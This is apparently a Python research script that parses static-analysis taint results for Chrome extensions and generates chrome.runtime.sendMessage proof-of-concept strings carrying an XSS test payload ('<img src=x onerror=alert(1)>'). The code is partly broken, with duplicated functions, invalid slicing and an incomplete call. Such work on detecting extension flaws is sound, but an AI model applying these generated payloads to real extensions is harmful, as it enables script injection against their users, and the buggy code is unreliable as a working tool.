import json
import pprint
import time

f = open('j.json')

results = json.load(f)

data = []

for i in results["results"]:
    data.append(i)

print(data.__len__())

tainted = []
other_vars = []

def runtime_onC(extid, payload, ssm, msgvar):
    html = 'rHTML'
    dots = '.'
    underscore = '_'
    message = ssm["message"]
    if html in message:
        sink_split = message.split("Sink:")
        sink = sink_split[-1]
    
    taintsink = ssm["sink"]
    taintsource = ssm["source"]
    x = msgvar[1]
    varfirst = taintsource.find(x)


    script = f'chrome.runtime.onConnect({extid},)'

def runtime_onM(extid, payload, ssm, msgvar):

    html = 'rHTML'
    dots = '.'
    underscore = '_'
    message = ssm[0]["message"]
    if html in message:
        sink_split = message.split('Sink:')
        sink = sink_split[-1]
    elif dots in message:
        sink_split = message.split(dots)
        sink = sink_split[-1]
    elif underscore in message:
        sink_split = message.split(underscore)
        sink = sink_split[-1]
    
    taintsink = ssm[0]["sink"]
    
    varindex = taintsink.find(sink+"(") + sink.__len__() + 1
    for i in msgvar:
        msgindex = taintsink.find(i)
        if msgindex == -1:
            continue
        elif varindex == msgindex:
            #source is here
            endvarindex = taintsink.find(")",varindex)
            if endvarindex == -1:
                endvarindex = 0
            source = taintsink[varindex:endvarindex]
            if dots in source:
                sourcel = source.split(dots)
                obj = {sourcel[1]:payload}
            else:
                obj = {payload}
        else:
            endvarindex = taintsink.find(")",msgindex)
            if endvarindex == -1:
                endvarindex = 0
            source = taintsink[msgindex:endvarindex]
            if dots in source:
                sourcel = source.split(dots)
                obj = {sourcel[1]:payload}
            else:
                obj = {payload}
    
    script = f'chrome.runtime.sendMessage({extid},{obj})'
    return script

for i in data:
    if "chrome_runtime_onMessage" in i["check_id"]:
        taint = {}
        taint_sink = i["extra"]["dataflow_trace"]["taint_sink"][1][1]
        taint_source = i["extra"]["dataflow_trace"]["taint_source"][1][1]
        metavars = []
        for j in i["extra"]["dataflow_trace"]["intermediate_vars"]:
            metavars.append(j["content"])
        other_vars.append({"content":metavars})
        message = i["extra"]["message"]
        taint["message"] = message
        taint["source"] = taint_source
        taint["sink"] = taint_sink
        tainted.append(taint)
        print(runtime_onM("extid","<img src=x onerror=alert(1)>",tainted,metavars))

    if "chrome_runtime_onConnect" in i["check_id"]:
        taint = {}
        taint_sink = i["extra"]["dataflow_trace"]["taint_sink"][1][1]
        taint_source = i["extra"]["dataflow_trace"]["taint_source"][1][1]
        metavars = []
        if i["extra"]["metavars"]["$OBJ"]:
            metavars.append(i["extra"]["metavars"]["$OBJ"]["abstract_content"])
        if i["extra"]["metavars"]["$X"]:
            metavars.append(i["extra"]["metavars"]["$X"]["abstract_content"])
        other_vars.append({"content":metavars})
        message = i["extra"]["message"]
        taint["message"] = message
        taint["source"] = taint_source
        taint["sink"] = taint_sink
        tainted.append(taint)

def runtime_onC(extid, payload, ssm, msgvar):
    html = 'rHTML'
    dots = '.'
    underscore = '_'
    message = ssm["message"]
    if html in message:
        sink_split = message.split("Sink:")
        sink = sink_split[-1]
    
    taintsink = ssm["sink"]
    taintsource = ssm["source"]
    x = msgvar[1]
    varfirst = taintsource.find(x)


    script = f'chrome.runtime.onConnect({extid},)'

def runtime_onM(extid, payload, ssm, msgvar):

    html = 'rHTML'
    dots = '.'
    underscore = '_'
    message = ssm["message"]
    if html in message:
        sink_split = message.split('Sink:')
        sink = sink_split[-1]
    elif dots in message:
        sink_split = message.split(dots)
        sink = sink_split[-1]
    elif underscore in message:
        sink_split = message.split(underscore)
        sink = sink_split[-1]
    
    taintsink = ssm["sink"]
    
    varindex = taintsink.find(sink+"(") + sink.__len__() + 1
    for i in msgvar:
        msgindex = taintsink.find(i)
        if msgindex == -1:
            continue
        elif varindex == msgindex:
            #source is here
            endvarindex = taintsink.find(")",varindex)
            if endvarindex == -1:
                endvarindex = 0
            source = taintsink[varindex,endvarindex-1]
            if dots in source:
                sourcel = source.split(dots)
                obj = {sourcel[1]:payload}
            else:
                obj = {payload}
        else:
            endvarindex = taintsink.find(")",msgindex)
            if endvarindex == -1:
                endvarindex = 0
            source = taintsink[msgindex,endvarindex-1]
            if dots in source:
                sourcel = source.split(dots)
                obj = {sourcel[1]:payload}
            else:
                obj = {payload}
    
    script = f'chrome.runtime.sendMessage({extid},{obj})'
    return script

print(runtime_onM("extid","<img src=x onerror=alert(1)>",))

# import os
# import fileinput

# # Specify the folder path containing the JavaScript files
# folder_path = "testing"

# for root, dirs, files in os.walk(folder_path):
#     # Perform the find and replace operation on each JavaScript file in the folder
#     for filename in files:
#         if filename.endswith(".js"):
#             file_path = os.path.join(root, filename)

#             # Perform the find and replace operation
#             with fileinput.FileInput(file_path, inplace=True,) as file:
#                 for line in file:
#                     # Replace "active: true" with "active: false"
#                     if "active: !0" in line:
#                         a = "active: !0"
#                     elif "active: true" in line:
#                         a = "active: true"
                    
#                     line = line.replace(a, "active: false")
#                     print(line, end="")
